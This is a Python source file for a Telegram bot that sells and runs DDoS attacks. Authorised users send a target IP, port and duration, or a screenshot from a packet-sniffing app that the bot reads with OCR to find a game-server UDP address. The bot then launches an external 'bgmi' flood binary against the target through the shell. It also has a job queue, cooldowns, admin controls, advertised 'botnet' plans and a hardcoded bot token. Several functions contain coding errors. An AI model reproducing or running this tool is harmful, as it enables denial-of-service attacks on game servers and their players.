#!/usr/bin/python3

import telebot
import time
import subprocess
import requests
import datetime
import os
import re
import pytesseract
from PIL import Image
from telebot import types
from collections import deque
import threading
import time


# insert your Telegram bot token here
bot = telebot.TeleBot('8227500008:AAFHWcXIxN1qoaRPXA1HePK9xLogb863ga4')

#admin gốc
super_admin = [6132441793]
# Admin user IDs
admin_id = [6132441793]

#Hàng đợi
attack_queue = deque()
current_attack = None

def run_attack(user_id, ip, port, attack_time, chat_id):
    global current_attack
    try:
        full_command = f"./bgmi {ip} {port} {attack_time} 250"
        bot.send_message(chat_id, f"🚀 Attack started: {ip}:{port} trong {attack_time}s")
        
        proc = subprocess.Popen(full_command, shell=True)
        proc.wait(timeout=attack_time)
        proc.terminate()
        
        bot.send_message(chat_id, f"✅ Attack finished: {ip}:{port}")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Lỗi khi chạy attack: {e}")
    finally:
        current_attack = None
        start_next_attack()

def start_next_attack():
    global current_attack
    if not current_attack and attack_queue:
        user_id, ip, port, attack_time, chat_id = attack_queue.popleft()
        current_attack = (user_id, ip, port, attack_time, chat_id)
        threading.Thread(target=run_attack, args=(user_id, ip, port, attack_time, chat_id)).start()
        
# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


#attack+stop button
main_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
main_keyboard.add("🚀Attack", "⛔Stop")
# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    message.from_user.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = message.from_user.id
    if user_id in super_admin:   # chỉ super admin mới thêm được
        parts = message.text.split()
        if len(parts) == 2:
            new_admin = int(parts[1])
            if new_admin not in admin_id:
                admin_id.append(new_admin)
                bot.reply_to(message, f"✅ Thêm admin phụ {new_admin} thành công.")
            else:
                bot.reply_to(message, f"⚠️ {new_admin} đã là admin rồi.")
        else:
            bot.reply_to(message, "⚠️ Dùng: /addadmin <user_id>")
    else:
        bot.reply_to(message, "❌ Bạn không có quyền dùng lệnh này.")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = message.from_user.id
    if user_id in super_admin:
        parts = message.text.split()
        if len(parts) == 2:
            target = int(parts[1])
            if target in super_admins:
                bot.reply_to(message, "❌ Không thể xóa super admin.")
                return
            if target in admin_id:
                admin_id.remove(target)
                bot.reply_to(message, f"✅ Đã xóa admin phụ {target}.")
            else:
                bot.reply_to(message, f"⚠️ {target} không phải admin.")
        else:
            bot.reply_to(message, "⚠️ Dùng: /removeadmin <user_id>")
    else:
        bot.reply_to(message, "❌ Bạn không có quyền dùng lệnh này.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = message.from_user.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = message.from_user.id
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(func=lambda m: m.chat.id in pending_time_request)
def set_time_for_target(message):
    user_id = str(message.from_user.id)
    if user_id not in allowed_user_ids:
    	bot.reply_to(message, "❌ Bạn không được phép dùng bot. Hãy liên hệ admin để được thêm quyền.")
        return
    try:
        time_val = int(message.text)
    except:
        bot.reply_to(message, "⚠️ Time phải là số nguyên.")
        return

    if time_val > 180:
        time_val = 180

    ip, port = pending_time_request.pop(message.chat.id)
    user_attack_data[message.from_user.id] = (ip, port, time_val)

    bot.reply_to(
        message,
        f"✅ Lưu target: {ip}:{port}, time: {time_val}s\nBấm 🚀Attack để bắt đầu 🚀"
    )

pending_time_request = {}  # lưu user nào đang chờ nhập time

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
	user_id = str(message.from_user.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "❌ Bạn không được phép dùng bot. Hãy liên hệ admin để được thêm quyền.")
        return
    try:
        # tải file ảnh từ Telegram
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # lưu ảnh tạm
        filename = f"{message.chat.id}_httpcanary.jpg"
        with open(filename, "wb") as f:
            f.write(downloaded_file)

        # OCR ảnh
        text = pytesseract.image_to_string(Image.open(filename))

        # regex: tìm IP + port (10010–10019) và có chữ UDP gần đó
        match = re.search(r'(udp).*?(\d+\.\d+\.\d+\.\d+):?(1001\d)', text, re.IGNORECASE)
        if match:
            ip = match.group(2)
            port = match.group(3)

            # lưu ip/port tạm thời, chờ user nhập time
            pending_time_request[message.chat.id] = (ip, port)
            bot.reply_to(
                message,
                f"✅ Tìm thấy target (UDP): {ip}:{port}\nVui lòng nhập time (≤180 giây):"
            )
        else:
            bot.reply_to(message, "❌ Không phát hiện target UDP port 1001x. Vui lòng gửi ảnh sạch hơn (HTTPCanary).")

    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi khi xử lý ảnh: {e}")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = message.from_user.id
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    message.from_user.id
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Free Fire"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = message.from_user.id
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "You Are On Cooldown ❌. Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 181:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 250"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <IP> <PORT> <Thời Gian>"  # Updated command syntax
    else:
        response = "❌ You Are Not Authorized To Use This Command ❌."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
👑or use attack/stop button
🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
🤖Try To Run This Command : /help 
 '''
    bot.send_message(message.chat.id, response, reply_markup=main_keyboard)
@bot.message_handler(commands=['admin'])
def check_admins(message):
    response = "👑 Danh sách Admin:\n"
    for uid in admin_id:
        try:
            user_info = bot.get_chat(int(uid))
            if user_info.username:
                response += f"- @{user_info.username} (ID: {uid})\n"
            else:
                response += f"- User ID: {uid}\n"
        except:
            response += f"- User ID: {uid}\n"
    bot.reply_to(message, response)

# Lưu target (ip, port, time) cho từng user
user_attack_data = {}
# Lưu thời gian cooldown của từng user
cooldown = {}
COOLDOWN_TIME = 120  # 120 giây

# Khi user gửi "ip port time"
@bot.message_handler(func=lambda m: len(m.text.split()) == 3)
def save_target(message):
	user_id = str(message.from_user.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "❌ Bạn không được phép dùng bot. Hãy liên hệ admin để được thêm quyền.")
        return
    parts = message.text.split()
    ip = parts[0]
    port = parts[1]
    try:
        attack_time = int(parts[2])
    except:
        return  # bỏ qua nếu không phải số

    if attack_time > 180:
        attack_time = 180

    user_attack_data[message.from_user.id] = (ip, port, attack_time)
    bot.reply_to(
        message,
        f"✅ Xác định mục tiêu: {ip}:{port}, time: {attack_time}s\nBấm nút Attack để bắt đầu 🚀"
    )


# Nút Attack
@bot.message_handler(func=lambda m: m.text == "🚀Attack")
def button_attack(message):
	user_id = str(message.from_user.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "❌ Bạn không được phép dùng bot. Hãy liên hệ admin để được thêm quyền.")
        return
	
    global current_attack   # để ngay dòng đầu hàm
    user_id = message.from_user.id
    if user_id not in admin_id:
        if user_id not in user_attack_data:
            bot.reply_to(message, "⚠️ Bạn chưa gửi target (ảnh hoặc ip port time).")
            return
        ip, port, attack_time = user_attack_data[user_id]

        if current_attack:
            attack_queue.append((user_id, ip, port, attack_time, message.chat.id))
            bot.reply_to(message, f"⏳ Attack đã được đưa vào hàng đợi. Vị trí: {len(attack_queue)}")
        else:
            current_attack = (user_id, ip, port, attack_time, message.chat.id)
            threading.Thread(target=run_attack, args=(user_id, ip, port, attack_time, message.chat.id)).start()
    else:
        # Admin => chạy ngay
        if user_id not in user_attack_data:
            bot.reply_to(message, "⚠️ Admin chưa có target nào.")
            return
        ip, port, attack_time = user_attack_data[user_id]
        threading.Thread(target=run_attack, args=(user_id, ip, port, attack_time, message.chat.id)).start()

# Nút Stop
@bot.message_handler(func=lambda m: m.text == "⛔Stop")
def button_stop(message):
    user_id = message.from_user.id
    if user_id in admin_id:
        try:
            os.system("pkill -f bgmi")
            bot.reply_to(message, "🛑 Attack stopped.")
        except Exception as e:
            bot.reply_to(message, f"❌ Lỗi khi stop: {e}")
    else:
        bot.reply_to(message, "❌ Bạn không có quyền dùng Stop.")
        
@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 180 (S)
> After Attack Limit : 5 Min
-> Concurrents Attack : 3
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)




bot.polling()
